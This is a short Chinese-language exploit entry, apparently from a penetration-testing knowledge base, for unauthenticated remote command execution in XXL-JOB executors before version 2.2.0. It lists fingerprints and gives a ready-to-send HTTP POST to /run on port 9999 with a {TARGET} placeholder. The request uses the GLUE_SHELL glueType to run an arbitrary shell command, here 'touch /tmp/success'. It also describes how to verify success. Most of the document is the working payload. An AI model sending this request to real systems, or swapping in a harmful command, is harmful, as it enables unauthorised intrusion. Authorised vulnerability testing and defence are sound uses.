# XXL-JOB Executor RCE (unacc)

## 漏洞指纹
- **组件**: XXL-JOB
- **版本**: 2.2.0 之前
- **特征**: Executor 接口（如 `/run`）未配置认证。

## 利用详情
- **Method**: `POST`
- **Path**: `/run`
- **原理**: 攻击者可以直接向 Executor 客户端发送恶意 JSON 数据包，利用 `glueType: GLUE_SHELL` 和 `glueSource` 字段执行任意 shell 命令。

## 执行示例
```http
POST /run HTTP/1.1
Host: {TARGET}:9999
Content-Type: application/json

{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "glueType": "GLUE_SHELL",
  "glueSource": "touch /tmp/success",
  "logId": 1,
  "logDateTime": 1586629003729
}
```

## Success Signal
- **物理验证**: 执行预期的命令（如 `touch /tmp/success`），目标系统成功创建文件。
- **状态验证**: 成功触发任务执行。
